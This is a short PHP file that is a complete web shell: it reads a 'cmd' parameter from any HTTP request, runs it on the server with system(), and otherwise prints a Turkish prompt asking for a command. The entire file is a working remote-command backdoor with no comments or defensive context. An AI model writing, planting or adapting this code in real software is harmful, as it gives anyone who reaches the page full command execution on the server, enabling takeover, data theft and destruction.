
<?php
  if(isset($_REQUEST['cmd'])) {
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
  } else {
    echo "Çalıştırmak istediğiniz komutu giriniz?";
  }
?>